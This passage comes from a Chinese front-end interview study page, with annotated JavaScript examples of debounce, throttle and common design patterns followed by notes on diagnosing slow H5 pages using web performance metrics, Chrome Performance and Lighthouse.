<span class="token keyword">function</span> <span class="token function">debounce</span><span class="token punctuation">(</span><span class="token parameter">fn<span class="token punctuation">,</span> delay <span class="token operator">=</span> <span class="token number">500</span></span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment">// timer 是闭包中的</span>
  <span class="token keyword">let</span> timer <span class="token operator">=</span> <span class="token keyword">null</span>
  <span class="token comment">// 这里返回的函数是每次用户实际调用的防抖函数</span>
  <span class="token comment">// 如果已经设定过定时器了就清空上一次的定时器</span>
  <span class="token comment">// 开始一个新的定时器，延迟执行用户传入的方法</span>
  <span class="token keyword">return</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>timer<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token function">clearTimeout</span><span class="token punctuation">(</span>timer<span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
    timer <span class="token operator">=</span> <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
      <span class="token function">fn</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> arguments<span class="token punctuation">)</span>
      timer <span class="token operator">=</span> <span class="token keyword">null</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span> delay<span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
input<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'keyup'</span><span class="token punctuation">,</span> <span class="token function">debounce</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>target<span class="token punctuation">)</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>input<span class="token punctuation">.</span>value<span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">600</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre></div></li> <li><strong>节流</strong> <ul><li>节流是将多次执行变成<code>每隔一段时间执行</code></li> <li>适用于：<code>resize</code>、<code>scroll</code>、<code>mousemove</code>等</li></ul> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">const</span> div <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'div'</span><span class="token punctuation">)</span>
<span class="token comment">// 节流</span>
<span class="token keyword">function</span> <span class="token function">throttle</span><span class="token punctuation">(</span><span class="token parameter">fn<span class="token punctuation">,</span> delay <span class="token operator">=</span> <span class="token number">100</span></span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">let</span> timer <span class="token operator">=</span> <span class="token keyword">null</span>

  <span class="token keyword">return</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>timer<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// 当前有任务了，直接返回</span>
      <span class="token keyword">return</span>
    <span class="token punctuation">}</span>
    timer <span class="token operator">=</span> <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
      <span class="token function">fn</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> arguments<span class="token punctuation">)</span>
      timer <span class="token operator">=</span> <span class="token keyword">null</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span> delay<span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token comment">// 拖拽</span>
div<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'drag'</span><span class="token punctuation">,</span> <span class="token function">throttle</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>offsetX<span class="token punctuation">,</span> e<span class="token punctuation">.</span>offsetY<span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre></div></li></ul></li></ul></li></ul> <h3 id="前端常用的设计模式和使用场景"><a href="#前端常用的设计模式和使用场景" class="header-anchor">#</a> 前端常用的设计模式和使用场景</h3> <ul><li><strong>工厂模式</strong> <ul><li>用一个工厂函数来创建实例，使用的时候隐藏<code>new</code>，可在工厂函数中使用<code>new</code>（<code>function factory(a,b,c) {return new Foo()}</code>）</li> <li>如<code>jQuery</code>的<code>$</code>函数：<code>$</code>等于是在内部使用了<code>new JQuery</code>实例（用工厂函数<code>$</code>包裹了一下），可以直接使用<code>$(div)</code></li> <li><code>react</code>的<code>createElement</code></li></ul></li> <li><strong>单例模式</strong> <ul><li>全局唯一的实例（无法生成第二个）</li> <li>如<code>Vuex</code>、<code>Redux</code>的<code>store</code></li> <li>如全局唯一的<code>dialog</code>、<code>modal</code></li> <li>演示<div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 通过class实现单例构造器</span>
<span class="token keyword">class</span> <span class="token class-name">Singleton</span> <span class="token punctuation">{</span>
  <span class="token keyword">private</span> <span class="token keyword">static</span> instance
  <span class="token keyword">private</span> <span class="token function">contructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>instance<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">this</span><span class="token punctuation">.</span>instance <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Singleton</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>instance
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token function">fn1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
  <span class="token function">fn2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment">// 通过闭包实现单例构造器</span>
<span class="token keyword">const</span> Singleton <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment">// 隐藏Class的构造函数，避免多次实例化</span>
  <span class="token keyword">function</span> <span class="token function">FooService</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>

  <span class="token comment">// 未初始化的单例对象</span>
  <span class="token keyword">let</span> fooService<span class="token punctuation">;</span>

  <span class="token keyword">return</span> <span class="token punctuation">{</span>
    <span class="token comment">// 创建/获取单例对象的函数</span>
    <span class="token comment">// 通过暴露一个 getInstance() 方法来创建/获取唯一实例</span>
    <span class="token function-variable function">getInstance</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>fooService<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        fooService <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FooService</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
      <span class="token keyword">return</span> fooService<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 使用</span>
<span class="token keyword">const</span> s1 <span class="token operator">=</span> Singleton<span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> s2 <span class="token operator">=</span> Singleton<span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment">// s1 === s2 // 都是同一个实例</span>
</code></pre></div></li></ul></li> <li><strong>代理模式</strong> <ul><li>使用者不能直接访问对象，而是访问一个代理层</li> <li>在代理层可以监听<code>get</code> <code>set</code>做很多事</li> <li>如<code>ES6 Proxy</code>实现<code>Vue3</code>响应式</li></ul> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Proxy</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span>
  <span class="token function-variable function">get</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">target<span class="token punctuation">,</span>key<span class="token punctuation">,</span>receiver</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> Refect<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span>key<span class="token punctuation">,</span>receiver<span class="token punctuation">)</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token function-variable function">set</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">target<span class="token punctuation">,</span>key<span class="token punctuation">,</span>value<span class="token punctuation">,</span>receiver</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> Refect<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span>key<span class="token punctuation">,</span>value<span class="token punctuation">,</span>receiver<span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre></div></li> <li><strong>观察者模式</strong> <ul><li>观察者模式（基于发布订阅模式）有观察者，也有被观察者</li> <li><strong>观察者需要放到被观察者中，被观察者的状态变化需要通知观察者</strong> 我变化了，内部也是基于发布订阅模式，收集观察者，状态变化后要主动通知观察者</li></ul> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">class</span> <span class="token class-name">Subject</span> <span class="token punctuation">{</span> <span class="token comment">// 被观察者 学生</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>state <span class="token operator">=</span> <span class="token string">'happy'</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>observers <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 存储所有的观察者</span>
  <span class="token punctuation">}</span>
  <span class="token comment">// 收集所有的观察者</span>
  <span class="token function">attach</span><span class="token punctuation">(</span><span class="token parameter">o</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment">// Subject. prototype. attch</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>observers<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
  <span class="token comment">// 更新被观察者 状态的方法</span>
  <span class="token function">setState</span><span class="token punctuation">(</span><span class="token parameter">newState</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>state <span class="token operator">=</span> newState<span class="token punctuation">;</span> <span class="token comment">// 更新状态</span>
    <span class="token comment">// this 指被观察者 学生</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>observers<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token parameter">o</span> <span class="token operator">=&gt;</span> o<span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// 通知观察者 更新它们的状态</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">Observer</span><span class="token punctuation">{</span> <span class="token comment">// 观察者 父母和老师</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name
  <span class="token punctuation">}</span>
  <span class="token function">update</span><span class="token punctuation">(</span><span class="token parameter">student</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'当前'</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">+</span> <span class="token string">'被通知了'</span><span class="token punctuation">,</span> <span class="token string">'当前学生的状态是'</span> <span class="token operator">+</span> student<span class="token punctuation">.</span>state<span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">let</span> student <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Subject</span><span class="token punctuation">(</span><span class="token string">'学生'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token keyword">let</span> parent <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Observer</span><span class="token punctuation">(</span><span class="token string">'父母'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token keyword">let</span> teacher <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Observer</span><span class="token punctuation">(</span><span class="token string">'老师'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 

<span class="token comment">// 被观察者存储观察者的前提，需要先接纳观察者</span>
student<span class="token punctuation">.</span><span class="token function">attach</span><span class="token punctuation">(</span>parent<span class="token punctuation">)</span><span class="token punctuation">;</span> 
student<span class="token punctuation">.</span><span class="token function">attach</span><span class="token punctuation">(</span>teacher<span class="token punctuation">)</span><span class="token punctuation">;</span> 
student<span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token string">'被欺负了'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div></li> <li><strong>发布订阅模式</strong> <ul><li>发布订阅者模式，一种对象间一对多的依赖关系，但一个对象的状态发生改变时，所依赖它的对象都将得到状态改变的通知。</li> <li><strong>主要的作用(优点)：</strong> <ul><li>广泛应用于异步编程中(替代了传递回调函数)</li> <li>对象之间松散耦合的编写代码</li></ul></li> <li><strong>缺点：</strong> <ul><li>创建订阅者本身要消耗一定的时间和内存</li> <li>多个发布者和订阅者嵌套一起的时候，程序难以跟踪维护</li></ul></li> <li><strong>发布订阅者模式和观察者模式的区别？</strong> <ul><li>发布/订阅模式是观察者模式的一种变形，两者区别在于，<strong>发布/订阅模式在观察者模式的基础上，在目标和观察者之间增加一个调度中心。</strong></li> <li><strong>观察者模式</strong>是由具体目标调度，比如当事件触发，<code>Subject</code> 就会去调用观察者的方法，所以观察者模式的订阅者与发布者之间是存在依赖的（互相认识的）。</li> <li><strong>发布/订阅模式</strong>由统一调度中心调用，因此发布者和订阅者不需要知道对方的存在（<code>publisher</code>和<code>subscriber</code>是不认识的，中间有个<code>Event Channel</code>隔起来了）</li> <li>总结一下：
<ul><li>观察者模式：<code>Subject</code>和<code>Observer</code>直接绑定，没有中间媒介。如<code>addEventListener</code>直接绑定事件</li> <li>发布订阅模式：<code>publisher</code>和<code>subscriber</code>互相不认识，需要有中间媒介<code>Event Channel</code>。如<code>EventBus</code>自定义事件
<img alt="" data-src="https://s.poetries.work/uploads/2023/01/15a98c64893feadc.png" loading="lazy" class="lazy"></li></ul></li></ul></li> <li><strong>实现的思路：</strong> <ul><li>创建一个对象(缓存列表)</li> <li><code>on</code>方法用来把回调函数<code>fn</code>都加到缓存列表中</li> <li><code>emit</code> 根据<code>key</code>值去执行对应缓存列表中的函数</li> <li><code>off</code>方法可以根据<code>key</code>值取消订阅</li></ul> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">class</span> <span class="token class-name">EventEmiter</span> <span class="token punctuation">{</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// 事件对象，存放订阅的名字和事件</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>_events <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token comment">// 订阅事件的方法</span>
  <span class="token function">on</span><span class="token punctuation">(</span><span class="token parameter">eventName<span class="token punctuation">,</span>callback</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>_events<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">this</span><span class="token punctuation">.</span>_events <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token comment">// 合并之前订阅的cb</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>_events<span class="token punctuation">[</span>eventName<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">...</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>_events<span class="token punctuation">[</span>eventName<span class="token punctuation">]</span> <span class="token operator">||</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>callback<span class="token punctuation">]</span>
  <span class="token punctuation">}</span>
  <span class="token comment">// 触发事件的方法</span>
  <span class="token function">emit</span><span class="token punctuation">(</span><span class="token parameter">eventName<span class="token punctuation">,</span> <span class="token operator">...</span>args</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>_events<span class="token punctuation">[</span>eventName<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">return</span>
    <span class="token punctuation">}</span>
    <span class="token comment">// 遍历执行所有订阅的事件</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>_events<span class="token punctuation">[</span>eventName<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token parameter">fn</span><span class="token operator">=&gt;</span><span class="token function">fn</span><span class="token punctuation">(</span><span class="token operator">...</span>args<span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
  <span class="token function">off</span><span class="token punctuation">(</span><span class="token parameter">eventName<span class="token punctuation">,</span>cb</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>_events<span class="token punctuation">[</span>eventName<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">return</span>
    <span class="token punctuation">}</span>
    <span class="token comment">// 删除订阅的事件</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>_events<span class="token punctuation">[</span>eventName<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_events<span class="token punctuation">[</span>eventName<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token parameter">fn</span><span class="token operator">=&gt;</span>fn <span class="token operator">!=</span> cb <span class="token operator">&amp;&amp;</span> fn<span class="token punctuation">.</span>l <span class="token operator">!=</span> cb<span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
  <span class="token comment">// 绑定一次 触发后将绑定的移除掉 再次触发掉</span>
  <span class="token function">once</span><span class="token punctuation">(</span><span class="token parameter">eventName<span class="token punctuation">,</span>callback</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> <span class="token function-variable function">one</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter"><span class="token operator">...</span>args</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>
      <span class="token comment">// 等callback执行完毕在删除</span>
      <span class="token function">callback</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span>
      <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">off</span><span class="token punctuation">(</span>eventName<span class="token punctuation">,</span>one<span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
    one<span class="token punctuation">.</span>l <span class="token operator">=</span> callback <span class="token comment">// 自定义属性</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span>eventName<span class="token punctuation">,</span>one<span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment">// 测试用例</span>
<span class="token keyword">let</span> event <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">EventEmiter</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">let</span> <span class="token function-variable function">login1</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter"><span class="token operator">...</span>args</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'login success1'</span><span class="token punctuation">,</span> args<span class="token punctuation">)</span>
<span class="token punctuation">}</span>
<span class="token keyword">let</span> <span class="token function-variable function">login2</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter"><span class="token operator">...</span>args</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'login success2'</span><span class="token punctuation">,</span> args<span class="token punctuation">)</span>
<span class="token punctuation">}</span>
<span class="token comment">// event.on('login',login1)</span>
event<span class="token punctuation">.</span><span class="token function">once</span><span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">,</span>login2<span class="token punctuation">)</span>
event<span class="token punctuation">.</span><span class="token function">off</span><span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">,</span>login1<span class="token punctuation">)</span> <span class="token comment">// 解除订阅</span>
event<span class="token punctuation">.</span><span class="token function">emit</span><span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span>
event<span class="token punctuation">.</span><span class="token function">emit</span><span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">)</span>
event<span class="token punctuation">.</span><span class="token function">emit</span><span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">)</span>  
</code></pre></div></li></ul></li> <li><strong>装饰器模式</strong> <ul><li>原功能不变，增加一些新功能（<code>AOP</code>面向切面编程）</li> <li><code>ES</code>和<code>TS</code>的<code>Decorator</code>语法就是装饰器模式</li></ul></li></ul> <blockquote><p>经典设计模式有<code>23</code> 个，这是基于后端写的，前端不是都常用</p></blockquote> <h3 id="如果一个h5很慢-如何排查性能问题"><a href="#如果一个h5很慢-如何排查性能问题" class="header-anchor">#</a> 如果一个H5很慢，如何排查性能问题</h3> <ul><li>通过前端性能指标分析</li> <li>通过<code>Performance</code>、<code>lighthouse</code>分析</li> <li>持续跟进，持续优化</li></ul> <p><strong>前端性能指标</strong></p> <ul><li><code>FP(First Paint)</code>：首次绘制，即首次绘制任何内容到屏幕上</li> <li><code>FCP(First Content Paint)</code>：首次内容绘制，即首次绘制非空白内容到屏幕上</li> <li><code>FMP(First Meaning Paint)</code>：首次有意义绘制，即首次绘制有意义的内容到屏幕上-已弃用，改用<code>LCP</code> <ul><li><code>FMP</code>业务指标，没有统一标准</li></ul></li> <li><code>LCP(Largest Contentful Paint)</code>：最大内容绘制，即最大的内容绘制到屏幕上</li> <li><code>TTI(Time to Interactive)</code>：可交互时间，即页面加载完成，可以进行交互的时间</li> <li><code>TBT(Total Blocking Time)</code>：总阻塞时间，即页面加载过程中，主线程被占用的时间</li> <li><code>CLS(Cumulative Layout Shift)</code>：累计布局偏移，即页面加载过程中，元素位置发生变化的程度</li> <li><code>FCP</code>、<code>LCP</code>、<code>TTI</code>、<code>TBT</code>、<code>CLS</code>都是<code>web-vitals</code>库提供的指标</li> <li><code>DCL(DOM Content Loaded)</code>：<code>DOM</code>加载完成，即页面<code>DOM</code>结构加载完成的时间</li> <li><code>L(Load)</code>：页面完全加载完成的时间</li></ul> <p><img alt="" data-src="https://s.poetries.work/uploads/2022/07/5eb6f5edb37a9abd.png" loading="lazy" class="lazy"></p> <p><strong>通过Chrome Performance分析</strong></p> <blockquote><p>打开浏览器无痕模式，点击<code>Performance &gt; ScreenShot</code></p></blockquote> <p><img alt="" data-src="https://s.poetries.work/uploads/2023/01/182f4ecc5a9438e1.png" loading="lazy" class="lazy"></p> <p>如果加载很快就会很快就到达<code>FP</code>，在分析<code>FCP、LCP、DCL、L</code>看渲染时间</p> <p><img alt="" data-src="https://s.poetries.work/uploads/2023/01/01b6b3e2049c7f2b.png" loading="lazy" class="lazy"></p> <p>国内访问GitHub可以看到加载到<code>FP</code>非常慢，但是渲染很快</p> <p><img alt="" data-src="https://s.poetries.work/uploads/2023/01/5b5e62734fa8f2cc.png" loading="lazy" class="lazy"></p> <p><code>network &gt; show overview</code> 查看每个资源的加载时间，或者从<code>waterfall</code>查看</p> <p><img alt="" data-src="https://s.poetries.work/uploads/2023/01/225e509acef89fbf.png" loading="lazy" class="lazy"></p> <p><strong>使用lighthouse分析</strong></p> <p><img alt="" data-src="https://s.poetries.work/uploads/2023/01/48150d9b04f2240f.png" loading="lazy" class="lazy"></p> <div class="language-bash extra-class"><pre class="language-bash"><code><span class="token comment"># 通过node使用</span>
<span class="token function">npm</span> i lighthouse -g

<span class="token comment"># 需要稍等一会就分析完毕输出报告</span>
lighthouse https://baidu.com --view --preset<span class="token operator">=</span>desktop
</code></pre></div><p><strong>通过工具就可以识别到问题</strong></p> <ul><li>加载慢？
<ul><li>优化服务器硬件配置，使用<code>CDN</code></li> <li>路由懒加载，大组件异步加载--减少主包体积</li> <li>优化<code>HTTP</code>缓存策略</li></ul></li> <li>渲染慢
<ul><li>优化服务端接口（如<code>Ajax</code>获取数据慢）</li> <li>继续分析，优化前端组件内部逻辑（参考<code>vue</code>、<code>react</code>优化）</li> <li>服务端渲染<code>SSR</code></li></ul></li></ul> <blockquote><p>性能优化是一个循序渐进的过程，不像bug一次解决。持续跟进统计结果，再逐步分析性能瓶颈，持续优化。可使用第三方统计服务，如百度统计</p></blockquote> <h3 id="后端一次性返回十万条数据-你该如何渲染"><a href="#后端一次性返回十万条数据-你该如何渲染" class="header-anchor">#</a> 后端一次性返回十万条数据，你该如何渲染</h3> <ul><li><strong>设计不合理</strong> <ul><li>后端返回十万条数据，本身技术方案设计就不合理（一般情况都是分页返回，返回十万条浏览器渲染是一个问题，十万条数据加载也需要一个过程）</li> <li>后端的问题，要用后端的思维去解决-中间层</li></ul></li> <li>浏览器能否处理十万条数据？
